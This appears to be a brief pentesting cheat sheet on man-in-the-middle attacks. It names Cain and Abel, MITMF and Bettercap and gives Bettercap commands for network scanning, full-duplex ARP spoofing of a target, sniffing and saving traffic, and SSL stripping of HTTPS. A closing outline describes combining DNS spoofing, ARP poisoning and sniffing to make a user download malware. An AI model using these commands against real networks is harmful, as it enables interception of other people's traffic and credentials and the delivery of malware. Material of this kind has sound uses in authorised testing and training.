# MITM

### Cain and Abel

For Windows (DEPRECATED)

***

### MITMF

For Linux (DEPRECATED)

***

### Bettercap

Better version of Ettercap

#### To see help for a command

`help command`

#### To see which devices are connected to network

`net.show`

#### To scan for devices in network

`net.probe on`

#### Arp Spoofing

In order to capture both external and internal traffic `set arp.spoof.fullduplex true`

To set a specific target `set arp.spoof.targets ip`

To Turn On `arp.spoof on`

To start sniffing `set net.sniff.local true`

Turn on sniffing `net.sniff on`

To save sniffed traffic `set net.sniff.output pentest.pcap`

To check https unencrypted traffic using ssl strip `set http.proxy.sslstrip true`

***

### Make User install malware using MITM

1. DNS SPOOFING
2. ARP POISONING
3. SNIFFING
4. Make user download malware in his pc

***
